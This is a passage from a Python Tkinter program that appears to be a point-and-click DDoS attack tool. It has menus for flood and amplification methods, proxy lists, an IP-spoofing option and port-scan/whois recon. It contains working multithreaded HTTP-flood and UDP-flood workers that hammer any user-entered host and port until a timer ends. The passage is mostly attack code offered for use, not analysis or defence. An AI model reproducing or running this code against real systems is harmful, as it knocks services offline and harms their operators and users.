            "Ping of Death": "Sends malformed or oversized ping packets to crash systems.",
            "RUDY": "R-U-Dead-Yet attack that sends long-form field submissions to tie up server resources.",
            "HTTP Killer": "High-intensity HTTP attack that floods the target with multiple request types.",
            "Mixed Attack": "Combines multiple attack methods for maximum effectiveness."
        }
        
        self.update_method_description()
        self.method_list.bind("<<ComboboxSelected>>", self.on_method_selected)
    
    def create_settings_tab(self, parent):
        notebook = ttk.Notebook(parent)
        notebook.pack(fill='both', expand=True, padx=10, pady=10)
        

        general_frame = ttk.Frame(notebook, padding=10)
        notebook.add(general_frame, text='General')
        
        ttk.Label(general_frame, text="Theme:").grid(row=0, column=0, padx=5, pady=5, sticky='w')
        self.theme_var = tk.StringVar(value="Dark")
        theme_combo = ttk.Combobox(general_frame, textvariable=self.theme_var, width=15)
        theme_combo['values'] = ('Dark', 'Light', 'Blue', 'Hacker')
        theme_combo.grid(row=0, column=1, padx=5, pady=5, sticky='w')
        theme_combo.bind("<<ComboboxSelected>>", self.change_theme)
        
        ttk.Label(general_frame, text="Animation Speed:").grid(row=1, column=0, padx=5, pady=5, sticky='w')
        self.anim_speed_var = tk.IntVar(value=30)
        ttk.Scale(general_frame, from_=10, to=100, orient='horizontal', 
                 variable=self.anim_speed_var).grid(row=1, column=1, padx=5, pady=5, sticky='we')
        
        ttk.Label(general_frame, text="Sound Effects:").grid(row=2, column=0, padx=5, pady=5, sticky='w')
        self.sound_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(general_frame, variable=self.sound_var, 
                       command=lambda: setattr(self, 'sound_effects', self.sound_var.get())).grid(row=2, column=1, padx=5, pady=5, sticky='w')
        
        ttk.Label(general_frame, text="Performance Mode:").grid(row=3, column=0, padx=5, pady=5, sticky='w')
        self.performance_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(general_frame, variable=self.performance_var,
                       command=lambda: setattr(self, 'performance_mode', self.performance_var.get())).grid(row=3, column=1, padx=5, pady=5, sticky='w')
        

        safety_frame = ttk.Frame(notebook, padding=10)
        notebook.add(safety_frame, text='Safety')
        
        ttk.Label(safety_frame, text="Max Bots:").grid(row=0, column=0, padx=5, pady=5, sticky='w')
        self.max_bots_var = tk.IntVar(value=10000)
        ttk.Entry(safety_frame, textvariable=self.max_bots_var, width=10).grid(row=0, column=1, padx=5, pady=5, sticky='w')
        
        ttk.Label(safety_frame, text="Max Threads:").grid(row=1, column=0, padx=5, pady=5, sticky='w')
        self.max_threads_var = tk.IntVar(value=500)
        ttk.Entry(safety_frame, textvariable=self.max_threads_var, width=10).grid(row=1, column=1, padx=5, pady=5, sticky='w')
        
        ttk.Label(safety_frame, text="Max Duration (s):").grid(row=2, column=0, padx=5, pady=5, sticky='w')
        self.max_duration_var = tk.IntVar(value=300)
        ttk.Entry(safety_frame, textvariable=self.max_duration_var, width=10).grid(row=2, column=1, padx=5, pady=5, sticky='w')
        
        ttk.Label(safety_frame, text="Auto-Stop on High CPU:").grid(row=3, column=0, padx=5, pady=5, sticky='w')
        self.autostop_cpu_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(safety_frame, variable=self.autostop_cpu_var).grid(row=3, column=1, padx=5, pady=5, sticky='w')
        
        ttk.Label(safety_frame, text="CPU Threshold (%):").grid(row=4, column=0, padx=5, pady=5, sticky='w')
        self.cpu_threshold_var = tk.IntVar(value=90)
        ttk.Entry(safety_frame, textvariable=self.cpu_threshold_var, width=10).grid(row=4, column=1, padx=5, pady=5, sticky='w')
        

        network_frame = ttk.Frame(notebook, padding=10)
        notebook.add(network_frame, text='Network')
        
        ttk.Label(network_frame, text="Network Interface:").grid(row=0, column=0, padx=5, pady=5, sticky='w')
        self.interface_var = tk.StringVar(value="Auto")
        interfaces = psutil.net_if_addrs().keys()
        interface_combo = ttk.Combobox(network_frame, textvariable=self.interface_var, width=15)
        interface_combo['values'] = ['Auto'] + list(interfaces)
        interface_combo.grid(row=0, column=1, padx=5, pady=5, sticky='w')
        
        ttk.Label(network_frame, text="Packet TTL:").grid(row=1, column=0, padx=5, pady=5, sticky='w')
        self.ttl_var = tk.IntVar(value=64)
        ttk.Entry(network_frame, textvariable=self.ttl_var, width=10).grid(row=1, column=1, padx=5, pady=5, sticky='w')
        
        ttk.Label(network_frame, text="Source IP Spoofing:").grid(row=2, column=0, padx=5, pady=5, sticky='w')
        self.spoofing_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(network_frame, variable=self.spoofing_var).grid(row=2, column=1, padx=5, pady=5, sticky='w')
        
        ttk.Label(network_frame, text="Source Port Range:").grid(row=3, column=0, padx=5, pady=5, sticky='w')
        port_frame = ttk.Frame(network_frame)
        port_frame.grid(row=3, column=1, padx=5, pady=5, sticky='w')
        self.src_port_min = ttk.Entry(port_frame, width=5)
        self.src_port_min.insert(0, "1024")
        self.src_port_min.pack(side='left')
        ttk.Label(port_frame, text="-").pack(side='left')
        self.src_port_max = ttk.Entry(port_frame, width=5)
        self.src_port_max.insert(0, "65535")
        self.src_port_max.pack(side='left')
        

        button_frame = ttk.Frame(parent)
        button_frame.pack(fill='x', padx=10, pady=10)
        
        ttk.Button(button_frame, text="Apply Settings", command=self.apply_settings).pack(side='left', padx=5)
        ttk.Button(button_frame, text="Restore Defaults", command=self.restore_defaults).pack(side='left', padx=5)
        ttk.Button(button_frame, text="Test Network", command=self.test_network).pack(side='right', padx=5)
    
    def create_stats_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True)
        

        stats_frame = ttk.LabelFrame(main_frame, text="Real-time Statistics", padding=10)
        stats_frame.pack(fill='both', expand=True, padx=10, pady=10)
        

        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='both', expand=True)
        

        left_col = ttk.Frame(stats_grid)
        left_col.pack(side='left', fill='both', expand=True, padx=5)
        
        ttk.Label(left_col, text="Packets Sent:", font=('Arial', 10, 'bold')).pack(pady=5)
        self.packets_label = ttk.Label(left_col, text="0", font=('Arial', 14, 'bold'), foreground='lightblue')
        self.packets_label.pack(pady=5)
        
        ttk.Label(left_col, text="Requests Sent:", font=('Arial', 10, 'bold')).pack(pady=5)
        self.requests_label = ttk.Label(left_col, text="0", font=('Arial', 14, 'bold'), foreground='lightgreen')
        self.requests_label.pack(pady=5)
        
        ttk.Label(left_col, text="Data Sent:", font=('Arial', 10, 'bold')).pack(pady=5)
        self.data_label = ttk.Label(left_col, text="0 MB", font=('Arial', 14, 'bold'), foreground='orange')
        self.data_label.pack(pady=5)
        

        mid_col = ttk.Frame(stats_grid)
        mid_col.pack(side='left', fill='both', expand=True, padx=5)
        
        ttk.Label(mid_col, text="Success Rate:", font=('Arial', 10, 'bold')).pack(pady=5)
        self.success_label = ttk.Label(mid_col, text="0%", font=('Arial', 14, 'bold'), foreground='cyan')
        self.success_label.pack(pady=5)
        
        ttk.Label(mid_col, text="Target Status:", font=('Arial', 10, 'bold')).pack(pady=5)
        self.target_status_label = ttk.Label(mid_col, text="Unknown", font=('Arial', 14, 'bold'), foreground='yellow')
        self.target_status_label.pack(pady=5)
        
        ttk.Label(mid_col, text="Attack Duration:", font=('Arial', 10, 'bold')).pack(pady=5)
        self.duration_label = ttk.Label(mid_col, text="0s", font=('Arial', 14, 'bold'), foreground='white')
        self.duration_label.pack(pady=5)
        

        right_col = ttk.Frame(stats_grid)
        right_col.pack(side='left', fill='both', expand=True, padx=5)
        
        ttk.Label(right_col, text="CPU Usage:", font=('Arial', 10, 'bold')).pack(pady=5)
        self.cpu_label = ttk.Label(right_col, text="0%", font=('Arial', 14, 'bold'), foreground='lightcoral')
        self.cpu_label.pack(pady=5)
        
        ttk.Label(right_col, text="Memory Usage:", font=('Arial', 10, 'bold')).pack(pady=5)
        self.memory_label = ttk.Label(right_col, text="0%", font=('Arial', 14, 'bold'), foreground='lightpink')
        self.memory_label.pack(pady=5)
        
        ttk.Label(right_col, text="Network Usage:", font=('Arial', 10, 'bold')).pack(pady=5)
        self.network_label = ttk.Label(right_col, text="0 KB/s", font=('Arial', 14, 'bold'), foreground='lightyellow')
        self.network_label.pack(pady=5)
        

        graph_frame = ttk.LabelFrame(main_frame, text="Attack History", padding=10)
        graph_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        self.graph_canvas = Canvas(graph_frame, bg='#1a1a2a', highlightthickness=0)
        self.graph_canvas.pack(fill='both', expand=True)
        

        history_frame = ttk.LabelFrame(main_frame, text="Recent Attacks", padding=10)
        history_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        columns = ("Time", "Target", "Method", "Duration", "Packets", "Success")
        self.history_tree = ttk.Treeview(history_frame, columns=columns, show="headings", height=5)
        
        for col in columns:
            self.history_tree.heading(col, text=col)
            self.history_tree.column(col, width=100)
        
        scrollbar = ttk.Scrollbar(history_frame, orient="vertical", command=self.history_tree.yview)
        self.history_tree.configure(yscrollcommand=scrollbar.set)
        
        self.history_tree.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')
    
    def create_status_bar(self):
        status_frame = ttk.Frame(self.root, style='Status.TFrame', height=25)
        status_frame.pack(side='bottom', fill='x')
        status_frame.pack_propagate(False)
        
        self.status_var = tk.StringVar()
        self.status_var.set("Status: Ready | Bots: 0 | Threads: 0 | Mode: DDoS | Target: 127.0.0.1")
        status_bar = ttk.Label(status_frame, textvariable=self.status_var, style='Status.TLabel')
        status_bar.pack(side='left', padx=10)
        

        self.connection_status = ttk.Label(status_frame, text="Disconnected", style='Status.TLabel', foreground='red')
        self.connection_status.pack(side='right', padx=10)
        

        self.status_canvas = Canvas(status_frame, width=20, height=20, bg='#1a2d3d', highlightthickness=0)
        self.status_canvas.pack(side='right', padx=10, pady=2)
        self.status_indicator_id = self.status_canvas.create_oval(2, 2, 18, 18, fill='gray')
    
    def process_queues(self):
        try:
            while not self.log_queue.empty():
                message, level = self.log_queue.get_nowait()
                self.log_display(message, level)
        except:
            pass
        

        try:
            while not self.stats_queue.empty():
                stats = self.stats_queue.get_nowait()
                self.update_stats_display(stats)
        except:
            pass
        

        current_time = time.time()
        if current_time - self.last_status_update > 0.5:  
            self.update_status_display()
            self.last_status_update = current_time
        
        self.root.after(50, self.process_queues)
    
    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        log_entry = f"[{timestamp}] [{level}] {message}"
        try:
            self.log_queue.put((log_entry, level))
        except:
            pass
    
    def log_display(self, log_entry, level):
        self.log_text.configure(state='normal')
        tag = "error" if level == "ERROR" else "info"
        self.log_text.insert(tk.END, log_entry + "\n", tag)
        self.log_text.configure(state='disabled')
        self.log_text.see(tk.END)
    
    def update_stats_display(self, stats):
        self.packets_label.config(text=f"{stats['packets_sent']:,}")
        self.requests_label.config(text=f"{stats['requests_sent']:,}")
        
        bytes_sent = stats.get('bytes_sent', 0)
        if bytes_sent > 1024*1024*1024:
            data_text = f"{bytes_sent/(1024*1024*1024):.2f} GB"
        elif bytes_sent > 1024*1024:
            data_text = f"{bytes_sent/(1024*1024):.2f} MB"
        elif bytes_sent > 1024:
            data_text = f"{bytes_sent/1024:.2f} KB"
        else:
            data_text = f"{bytes_sent} B"
        self.data_label.config(text=data_text)
        
        self.success_label.config(text=f"{stats.get('success_rate', 0):.1f}%")
        self.target_status_label.config(text=stats.get('target_status', 'Unknown'))
        

        if stats['start_time'] > 0:
            duration = int(time.time() - stats['start_time'])
            self.duration_label.config(text=f"{duration}s")
        

        self.cpu_label.config(text=f"{self.cpu_usage:.1f}%")
        self.memory_label.config(text=f"{self.memory_usage:.1f}%")
        self.network_label.config(text=f"{self.network_usage:.1f} KB/s")
    
    def update_status_display(self):
        duration = time.time() - self.attack_stats.get("start_time", 0)
        packets = self.attack_stats.get("packets_sent", 0)
        requests = self.attack_stats.get("requests_sent", 0)
        bots_active = self.attack_stats.get("active_bots", 0)
        threads_active = self.attack_stats.get("active_threads", 0)
        
        progress = min(100, (duration / self.duration) * 100) if self.duration > 0 else 0
        self.progress_var.set(progress)
        
        if self.running:
            status = "Attacking"
            self.connection_status.config(text="Connected", foreground='green')
        else:
            status = "Ready"
            self.connection_status.config(text="Disconnected", foreground='red')
        
        self.status_var.set(f"Status: {status} | Bots: {bots_active} | Threads: {threads_active} | Mode: {self.attack_mode} | Target: {self.target_ip}:{self.target_port}")
    
    def create_visualization(self):
        self.canvas.delete("all")
        self.animation_items = []
        self.packet_trails = []
        self.bot_details = {}
        

        server_x, server_y = 400, 300
        self.server = self.canvas.create_oval(server_x-50, server_y-50, server_x+50, server_y+50, 
                              fill='#cc3333', outline='#ff6666', width=2, tags="server")
        self.canvas.create_text(server_x, server_y, text="TARGET\nSERVER", 
                               fill='white', font=('Arial', 10, 'bold'), tags="server")
        

        self.bots = []
        self.bot_positions = []
        num_bots = min(20, self.bot_count)  
        
        radius = 250
        for i in range(num_bots):
            angle = 2 * math.pi * i / num_bots
            x = server_x + radius * math.cos(angle)
            y = server_y + radius * math.sin(angle)
            
            bot_id = f"bot_{i}"
            bot = self.canvas.create_oval(x-15, y-15, x+15, y+15, 
                                         fill='#33cc33', outline='#66ff66', width=2, 
                                         tags=("bot", bot_id))
            
            self.canvas.create_text(x, y, text=f"B{i+1}", fill='white', font=('Arial', 8, 'bold'),
                                   tags=("bot_text", bot_id))
            
            self.bots.append(bot)
            self.bot_positions.append((x, y))
            
            self.bot_details[bot_id] = {
                'id': i+1,
                'status': 'Idle',
                'threads': self.thread_count,
                'packets_sent': 0,
                'requests_sent': 0,
                'success_rate': 0,
                'position': (x, y),
                'thread_status': ['Idle'] * self.thread_count
            }
        
        self.server_pos = (server_x, server_y)
    
    def on_canvas_click(self, event):

        item = self.canvas.find_closest(event.x, event.y)
        if not item:
            return
            
        tags = self.canvas.gettags(item[0])
        for tag in tags:
            if tag.startswith("bot_"):
                self.selected_bot = tag
                self.show_bot_details()
                return
    
    def show_bot_details(self):
        if not self.selected_bot or self.selected_bot not in self.bot_details:
            return
            
        bot = self.bot_details[self.selected_bot]
        self.bot_details_text.configure(state='normal')
        self.bot_details_text.delete(1.0, tk.END)
        
        details = f"Bot ID: {bot['id']}\n"
        details += f"Status: {bot['status']}\n"
        details += f"Threads: {bot['threads']}\n"
        details += f"Packets Sent: {bot['packets_sent']}\n"
        details += f"Requests Sent: {bot['requests_sent']}\n"
        details += f"Success Rate: {bot['success_rate']}%\n\n"
        details += "Thread Status:\n"
        
        for i, status in enumerate(bot['thread_status']):
            details += f"  Thread {i+1}: {status}\n"
        
        self.bot_details_text.insert(tk.END, details)
        self.bot_details_text.configure(state='disabled')
    
    def animate_attack(self):
        if not self.running:
            self.root.after(100, self.animate_attack)
            return
        
        current_time = time.time() * 1000
        if current_time - self.last_animation_time < self.animation_delay:
            self.root.after(10, self.animate_attack)
            return
            
        self.last_animation_time = current_time
        
        server_x, server_y = self.server_pos
        

        for bot_id, bot_info in self.bot_details.items():

            if random.random() < 0.1:  
                thread_idx = random.randint(0, bot_info['threads']-1)
                statuses = ['Idle', 'Connecting', 'Requesting', 'Downloading', 'Completed', 'Failed']
                bot_info['thread_status'][thread_idx] = random.choice(statuses)
            

            bot_circle = self.canvas.find_withtag(bot_id)
            if bot_circle:
                status = bot_info['status']
                color = '#33cc33'  
                
                if status == 'Attacking':
                    color = '#ff3333'  
                elif status == 'Connecting':
                    color = '#ff9933'  
                elif status == 'Completed':
                    color = '#3366ff'  
                
                self.canvas.itemconfig(bot_circle[0], fill=color)
        

        if self.running:
            intensity = min(10, max(1, self.thread_count // 5))
            for _ in range(intensity):
                if len(self.packet_trails) < 50:  
                    bot_idx = random.randint(0, len(self.bot_positions)-1)
                    bot_x, bot_y = self.bot_positions[bot_idx]
                    

                    colors = {
                        'HTTP': '#ff5555',
                        'UDP': '#5555ff',
                        'TCP': '#ffff55',
                        'ICMP': '#55ffff'
                    }
                    color = random.choice(list(colors.values()))
                    
                    trail = self.canvas.create_line(bot_x, bot_y, bot_x, bot_y, 
                                                  fill=color, width=2, arrow=tk.LAST, 
                                                  arrowshape=(8, 10, 5))
                    self.packet_trails.append({
                        'id': trail,
                        'start': (bot_x, bot_y),
                        'end': (server_x, server_y),
                        'progress': 0,
                        'speed': random.uniform(0.1, 0.3),
                        'type': random.choice(list(colors.keys()))
                    })
        

        trails_to_remove = []
        for i, trail in enumerate(self.packet_trails):
            trail['progress'] += trail['speed']
            if trail['progress'] >= 1:
                trails_to_remove.append(i)
                continue
                
            sx, sy = trail['start']
            ex, ey = trail['end']
            cx = sx + (ex - sx) * trail['progress']
            cy = sy + (ey - sy) * trail['progress']
            
            self.canvas.coords(trail['id'], sx, sy, cx, cy)
        

        for i in sorted(trails_to_remove, reverse=True):
            self.canvas.delete(self.packet_trails[i]['id'])
            self.packet_trails.pop(i)
        
        self.root.after(10, self.animate_attack)
    
    def update_status_indicator(self):
        try:
            target = self.target_entry.get().replace("http://", "").replace("https://", "").split('/')[0]
            start_time = time.time()
            

            try:
                socket.gethostbyname(target)
            except:
                self.status_indicator = "red"
                self.status_canvas.itemconfig(self.status_indicator_id, fill='red')
                self.root.after(10000, self.update_status_indicator)
                return
                

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            result = s.connect_ex((target, int(self.port_entry.get())))
            s.close()
            
            if result == 0:
                response_time = (time.time() - start_time) * 1000
                
                if response_time < 100:
                    color = "green"
                    status = "Operational"
                elif response_time < 1000:
                    color = "orange"
                    status = "Slow"
                else:
                    color = "red"
                    status = "Unresponsive"
            else:
                color = "red"
                status = "Offline"
        except:
            color = "red"
            status = "Offline"
        
        self.status_indicator = color
        self.status_canvas.itemconfig(self.status_indicator_id, fill=color)
        

        if status != "Offline" and self.geo_label.cget("text") == "Unknown":
            threading.Thread(target=self.get_geolocation, args=(target,), daemon=True).start()
        
        if not self.running:
            self.root.after(10000, self.update_status_indicator)
    
    def get_geolocation(self, target):
        try:

            reader = geoip2.database.Reader(self.resource_path('GeoLite2-City.mmdb'))
            response = reader.city(socket.gethostbyname(target))
            country = response.country.name
            city = response.city.name
            self.geo_label.config(text=f"{city}, {country}")
        except:
            self.geo_label.config(text="Location unknown")
    
    def schedule_resolution(self, event):
        current_time = time.time() * 1000
        if current_time - self.last_resolve_time > self.resolve_delay:
            self.resolve_target()
            self.last_resolve_time = current_time
        else:
            self.root.after(300, self.resolve_target)
    
    def resolve_target(self, event=None):
        url = self.target_entry.get()
        if not url:
            return
            
        if not re.match(r"^https?://", url):
            url = "http://" + url
        
        try:
            domain = url.split("//")[-1].split("/")[0]
            self.target_url = domain
            
            threading.Thread(target=self.perform_dns_resolution, args=(domain,), daemon=True).start()
        except Exception as e:
            self.log(f"Resolution error: {str(e)}", "ERROR")
    
    def perform_dns_resolution(self, domain):
        try:
            self.target_ip = socket.gethostbyname(domain)
            self.root.after(0, self.update_ip_entry, self.target_ip)
            self.root.after(0, self.update_status_indicator)
        except Exception as e:
            self.log(f"DNS resolution failed: {str(e)}", "ERROR")
    
    def update_ip_entry(self, ip):
        self.ip_entry.delete(0, tk.END)
        self.ip_entry.insert(0, ip)
    
    def update_mode(self):
        self.attack_mode = self.mode_var.get()
        if self.attack_mode == "DoS":
            self.bot_var.set(1)
            self.bot_slider.config(to=1)
            self.bot_entry.config(state='disabled')
        else:
            self.bot_slider.config(to=self.max_bots_var.get())
            self.bot_entry.config(state='normal')
    
    def toggle_proxy(self):
        self.use_proxies = self.proxy_var.get()
        self.proxy_button.config(state='normal' if self.use_proxies else 'disabled')
    
    def load_proxy_file(self):
        file_path = filedialog.askopenfilename(title="Select Proxy List", 
                                              filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    self.proxies = [line.strip() for line in f.readlines() if line.strip()]
                self.log(f"Loaded {len(self.proxies)} proxies from {file_path}")
            except Exception as e:
                self.log(f"Failed to load proxies: {str(e)}", "ERROR")
        else:
            self.proxy_var.set(False)
            self.proxy_button.config(state='disabled')
    
    def start_attack(self):
        if self.running:
            return
            
        try:
            self.target_ip = self.ip_entry.get()
            self.target_port = int(self.port_entry.get())
            self.bot_count = min(self.bot_var.get(), self.max_bots_var.get())
            self.thread_count = min(self.thread_var.get(), self.max_threads_var.get())
            self.duration = min(self.duration_var.get(), self.max_duration_var.get())
            self.method = self.method_var.get()
        except ValueError:
            messagebox.showerror("Input Error", "Please enter valid numeric values")
            return
            
        if self.attack_mode == "DoS":
            self.bot_count = 1
            
        self.start_button.config(state='disabled')
        self.stop_button.config(state='normal')
        self.running = True
        

        for key in self.attack_stats:
            self.attack_stats[key] = 0
        self.attack_stats['start_time'] = time.time()
        self.attack_stats['active_bots'] = self.bot_count
        self.attack_stats['active_threads'] = self.bot_count * self.thread_count
        
        self.progress_var.set(0)
        

        self.attack_thread = threading.Thread(
            target=self.launch_attack_thread,
            args=(self.target_ip, self.target_port, self.method, 
                  self.bot_count, self.thread_count, self.duration,
                  self.use_proxies, self.proxies),
            daemon=True
        )
        self.attack_thread.start()
        
        self.play_sound("attack_start")
        self.log(f"Starting {self.attack_mode} attack on {self.target_ip}:{self.target_port}")
        self.log(f"Method: {self.method}, Bots: {self.bot_count}, Threads: {self.thread_count}")
        

        self.create_visualization()
    
    def launch_attack_thread(self, target_ip, target_port, method, bot_count, thread_count, 
                           duration, use_proxies, proxies):

        try:
            if method == "HTTP Flood":
                self.http_flood(target_ip, target_port, bot_count, thread_count, duration)
            elif method == "UDP Flood":
                self.udp_flood(target_ip, target_port, bot_count, thread_count, duration)
            elif method == "SYN Flood":
                self.syn_flood(target_ip, target_port, bot_count, thread_count, duration)
            elif method == "ICMP Flood":
                self.icmp_flood(target_ip, target_port, bot_count, thread_count, duration)
            elif method == "Slowloris":
                self.slowloris(target_ip, target_port, bot_count, thread_count, duration)
            elif method == "DNS Amplification":
                self.dns_amplification(target_ip, target_port, bot_count, thread_count, duration)
            elif method == "SSDP":
                self.ssdp_attack(target_ip, target_port, bot_count, thread_count, duration)
            elif method == "NTP Amplification":
                self.ntp_amplification(target_ip, target_port, bot_count, thread_count, duration)
            elif method == "Memcached":
                self.memcached_attack(target_ip, target_port, bot_count, thread_count, duration)
            elif method == "Ping of Death":
                self.ping_of_death(target_ip, target_port, bot_count, thread_count, duration)
            elif method == "RUDY":
                self.rudy_attack(target_ip, target_port, bot_count, thread_count, duration)
            elif method == "HTTP Killer":
                self.http_killer_attack(target_ip, target_port, bot_count, thread_count, duration)
            elif method == "Mixed Attack":
                self.mixed_attack(target_ip, target_port, bot_count, thread_count, duration)
        except Exception as e:
            self.log(f"Attack error: {str(e)}", "ERROR")
        finally:
            self.running = False
            self.root.after(0, lambda: self.stop_button.config(state='disabled'))
            self.root.after(0, lambda: self.start_button.config(state='normal'))
    
    def http_flood(self, target_ip, target_port, bot_count, thread_count, duration):
        self.log("Starting HTTP Flood attack", "INFO")
        
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
        ]
        
        paths = ['/', '/index.html', '/api/data', '/images/logo.png', '/videos/demo.mp4']
        methods = ['GET', 'POST', 'HEAD']
        host = self.target_url if self.target_url else target_ip
        
        start_time = time.time()
        end_time = start_time + duration
        

        with concurrent.futures.ThreadPoolExecutor(max_workers=min(500, thread_count * bot_count)) as executor:
            futures = []
            
            for _ in range(bot_count * thread_count):
                if time.time() > end_time:
                    break
                    
                futures.append(executor.submit(
                    self.http_worker, 
                    target_ip, target_port, host, user_agents, paths, methods, end_time
                ))
            

            concurrent.futures.wait(futures, timeout=max(0, end_time - time.time()))
    
    def http_worker(self, target_ip, target_port, host, user_agents, paths, methods, end_time):
        local_count = 0
        local_bytes = 0
        
        while time.time() < end_time and self.running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(2.0)
                    s.connect((target_ip, target_port))
                    
                    method = random.choice(methods)
                    path = random.choice(paths)
                    
                    request = (
                        f"{method} {path} HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        f"User-Agent: {random.choice(user_agents)}\r\n"
                        f"Accept: */*\r\n"
                        f"Connection: close\r\n"
                        f"\r\n"
                    )
                    
                    s.send(request.encode())
                    local_count += 1
                    local_bytes += len(request)
                    

                    try:
                        response = s.recv(1024)
                        local_bytes += len(response)
                    except:
                        pass
                    

                    if local_count % 10 == 0:
                        self.attack_stats['requests_sent'] += local_count
                        self.attack_stats['bytes_sent'] += local_bytes
                        self.attack_stats['success_rate'] = 80  
                        local_count = 0
                        local_bytes = 0
            except Exception as e:
                pass
        

        if local_count > 0:
            self.attack_stats['requests_sent'] += local_count
            self.attack_stats['bytes_sent'] += local_bytes
    
    
    def udp_flood(self, target_ip, target_port, bot_count, thread_count, duration):
        self.log("Starting UDP Flood attack", "INFO")
        
        start_time = time.time()
        end_time = start_time + duration
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=min(500, thread_count * bot_count)) as executor:
            futures = []
            
            for _ in range(bot_count * thread_count):
                if time.time() > end_time:
                    break
                    
                futures.append(executor.submit(
                    self.udp_worker, 
                    target_ip, target_port, end_time
                ))
            
            concurrent.futures.wait(futures, timeout=max(0, end_time - time.time()))
    
    def udp_worker(self, target_ip, target_port, end_time):
        local_count = 0
        local_bytes = 0
        
        while time.time() < end_time and self.running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    payload = os.urandom(random.randint(64, 1024))
                    s.sendto(payload, (target_ip, target_port))
                    local_count += 1
                    local_bytes += len(payload)
                    
                    if local_count % 50 == 0:
                        self.attack_stats['packets_sent'] += local_count
                        self.attack_stats['bytes_sent'] += local_bytes
                        local_count = 0
                        local_bytes = 0
            except:
                pass
        
        if local_count > 0:
            self.attack_stats['packets_sent'] += local_count
            self.attack_stats['bytes_sent'] += local_bytes
    
    def mixed_attack(self, target_ip, target_port, bot_count, thread_count, duration):
        self.log("Starting Mixed Attack", "INFO")
        
        methods = [
            self.http_flood,
            self.udp_flood,
            self.syn_flood,
            self.icmp_flood
        ]
        
        threads = []
        
        for method in methods:
            t = threading.Thread(
                target=method,
                args=(target_ip, target_port, bot_count // len(methods), 
                      thread_count, duration),
                daemon=True
            )
            t.start()
            threads.append(t)
        
        start_time = time.time()
        end_time = start_time + duration
        
        for t in threads:
            t.join(max(0, end_time - time.time()))
    
    def stop_attack(self):
        self.running = False
        self.start_button.config(state='normal')
        self.stop_button.config(state='disabled')
        
        self.play_sound("attack_stop")
        self.log("Attack stopped")
        
        self.record_attack_history()
    
    def record_attack_history(self):
        attack_record = (
            datetime.now().strftime("%H:%M:%S"),
            self.target_ip,
            self.method,
            f"{int(time.time() - self.attack_stats.get('start_time', 0))}s",
            f"{self.attack_stats.get('packets_sent', 0):,}",
            f"{self.attack_stats.get('success_rate', 0):.1f}%"
        )
        
        self.history_tree.insert("", "end", values=attack_record)
        
        if len(self.history_tree.get_children()) > 10:
            self.history_tree.delete(self.history_tree.get_children()[0])
    
    def reset(self):
        self.stop_attack()
        self.bot_var.set(100)
        self.thread_var.set(50)
        self.duration_var.set(30)
        self.method_var.set("HTTP Flood")
        self.mode_var.set("DDoS")
        self.target_entry.delete(0, tk.END)
        self.target_entry.insert(0, "http://127.0.0.1")
        self.ip_entry.delete(0, tk.END)
        self.ip_entry.insert(0, "127.0.0.1")
        self.port_entry.delete(0, tk.END)
        self.port_entry.insert(0, "80")
        self.log_text.configure(state='normal')
        self.log_text.delete(1.0, tk.END)
        self.log_text.configure(state='disabled')
        
        for key in self.attack_stats:
            self.attack_stats[key] = 0
            
        self.progress_var.set(0)
        self.update_status_indicator()
        
        for item in self.history_tree.get_children():
            self.history_tree.delete(item)
    
    def start_recon(self, tool):
        target = self.recon_entry.get()
        if not target:
            return
            
        self.recon_text.configure(state='normal')
        self.recon_text.delete(1.0, tk.END)
        self.recon_text.insert(tk.END, f"Starting {tool} on {target}...\n")
        self.recon_text.see(tk.END)
        self.recon_text.configure(state='disabled')
        
        recon_thread = threading.Thread(target=self.perform_recon, args=(target, tool), daemon=True)
        recon_thread.start()
    
    def perform_recon(self, target, tool):
        try:
            self.recon_text.configure(state='normal')
            self.recon_text.insert(tk.END, f"\n=== {tool.upper()} Results ===\n")
            
            if tool == "ping":
                result = subprocess.run(['ping', '-c', '4', target], capture_output=True, text=True)
                self.recon_text.insert(tk.END, result.stdout)
                
            elif tool == "traceroute":
                result = subprocess.run(['tracert', target], capture_output=True, text=True)
                self.recon_text.insert(tk.END, result.stdout)
                
            elif tool == "portscan":
                self.recon_text.insert(tk.END, f"Scanning ports on {target}...\n")
                open_ports = []
                common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 587, 993, 995, 3306, 3389]
                
                for port in common_ports:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    result = s.connect_ex((target, port))
                    s.close()
                    
                    if result == 0:
                        open_ports.append(port)
                        self.recon_text.insert(tk.END, f"Port {port}: OPEN\n")
                    else:
                        self.recon_text.insert(tk.END, f"Port {port}: closed\n")
                
                self.recon_text.insert(tk.END, f"\nOpen ports: {', '.join(map(str, open_ports))}\n")
                
            elif tool == "whois":
                try:
                    w = whois.whois(target)
                    self.recon_text.insert(tk.END, f"Domain: {w.domain_name}\n")
                    self.recon_text.insert(tk.END, f"Registrar: {w.registrar}\n")
                    self.recon_text.insert(tk.END, f"Creation Date: {w.creation_date}\n")
